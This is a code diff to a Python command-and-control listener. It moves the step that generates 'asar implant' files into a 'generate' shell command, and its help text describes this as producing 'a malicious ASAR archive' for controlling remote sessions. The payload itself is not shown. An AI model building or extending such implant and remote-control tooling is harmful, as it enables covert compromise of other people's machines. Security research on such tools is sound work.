@@ -277,25 +277,11 @@ def input_thread():
         
     print(f"Starting listener on port: {PORT}!")
 
-    asarchoice = ""
-
-    while asarchoice != "y" or asarchoice != "n":
-        asarchoice = input("Would you like to generate asar implant file? (y or n): ")
-        if asarchoice == "y":
-            generateAsar()
-            break
-        elif asarchoice == "n":
-            break
-        else:
-            print("Please enter y or n")
-
     global global_lock
     global_lock = False
 
     global global_connection
     global HISTORY_INDEX
-
-    print("Waiting for client...")
 
     while True:
         new_cmd = ""
@@ -307,28 +293,6 @@ def input_thread():
         #keyboard.on_press_key("up", print("up"))
 
         global CURRENT_SESSION
-        """
-        while global_CURRENT_SESSION == "none":
-            print("\nSessions:")
-            
-            sessionChoice = input("\nPlease select a session: ")
-            if sessionChoice in SESSIONS:
-                CURRENT_SESSION = sessionChoice
-                print(f"Using session {CURRENT_SESSION}.")
-                break
-            elif int(sessionChoice) < len(SESSIONS):
-                CURRENT_SESSION = SESSIONS[int(sessionChoice)]
-                print(f"Using session {CURRENT_SESSION}.")
-                break
-            else:
-                print("Please specify a valid session.")
-        """            
-        """
-        while len(SESSIONS) == 0:
-            if len(SESSIONS) > 0:
-                break
-        """
-        
 
         while selection == "":
             selection = input("$ ")
@@ -343,8 +307,12 @@ def input_thread():
                 choice = selection.split(' ')[1]
                 selectSession(choice)
                 break
+            elif selection.strip() == "generate":
+                generateAsar()
+                selection = ""
             elif selection == "help":
                 print(f"""
+    - use \"generate\" to generate a malicious ASAR archive.
     - use \"sessions\" to list current sessions.
     - use \"use\" to select a session (either by session number or session ID).
     - use \"help\" to view this help message.
@@ -360,10 +328,6 @@ def input_thread():
                 print("Please enter a valid command.")
                 selection = ""
 
-        
-
-        
-    
         if global_connection and CURRENT_SESSION != "none":
             new_cmd = input("$ ").lower()
         #help
